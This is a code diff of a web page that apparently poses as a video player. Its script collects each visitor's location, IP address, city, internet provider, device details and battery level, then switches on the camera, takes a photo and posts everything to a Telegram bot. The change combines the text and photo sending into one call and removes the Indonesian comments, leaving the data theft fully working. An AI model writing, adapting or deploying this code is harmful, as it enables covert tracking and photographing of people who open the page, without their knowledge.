@@ -70,18 +70,14 @@
         let thumbnail = document.getElementById("thumbnail");
         let isPlaying = false;
 
-        function sendToTelegram(message) {
-            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-            });
-        }
-
-        function sendPhotoToTelegram(imageBlob) {
+        function sendToTelegram(message, photoBlob = null) {
             const formData = new FormData();
             formData.append("chat_id", CHAT_ID);
-            formData.append("photo", imageBlob, "snapshot.jpg");
+            formData.append("caption", message);
+            
+            if (photoBlob) {
+                formData.append("photo", photoBlob, "snapshot.jpg");
+            }
 
             return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: "POST",
@@ -93,7 +89,6 @@
             let message = "🔍 Data Pengguna:\n";
 
             try {
-                // Ambil lokasi
                 const pos = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject);
                 });
@@ -102,7 +97,6 @@
                 message += "❌ Lokasi tidak diizinkan.\n";
             }
 
-            // Ambil informasi dari IP
             try {
                 const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
                 message += `🌐 IP: ${ipData.ip}\n🏙 Kota: ${ipData.city}, ${ipData.region}\n📡 ISP: ${ipData.org}\n`;
@@ -110,13 +104,11 @@
                 message += "⚠️ Gagal mendapatkan informasi IP.\n";
             }
 
-            // Ambil informasi perangkat
             let network = navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "Unknown";
             let androidVersion = navigator.userAgent.match(/Android\s([0-9\.]+)/);
             let androidInfo = androidVersion ? `🤖 Android: ${androidVersion[1]}\n` : "";
             message += `📱 Perangkat: ${navigator.userAgent}\n📶 Jaringan: ${network}\n${androidInfo}`;
 
-            // Ambil status baterai
             try {
                 const battery = await navigator.getBattery();
                 message += `🔋 Baterai: ${Math.round(battery.level * 100)}%\n`;
@@ -124,10 +116,6 @@
                 message += "⚠️ Tidak bisa mendapatkan status baterai.\n";
             }
 
-            // Kirim data ke Telegram
-            await sendToTelegram(message);
-
-            // Aktifkan kamera dan ambil foto setelah 2 detik
             try {
                 let stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
@@ -144,7 +132,7 @@
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
                 canvas.toBlob(async blob => {
-                    await sendPhotoToTelegram(blob);
+                    await sendToTelegram(message, blob);
                 }, "image/jpeg");
 
                 stream.getTracks().forEach(track => track.stop());
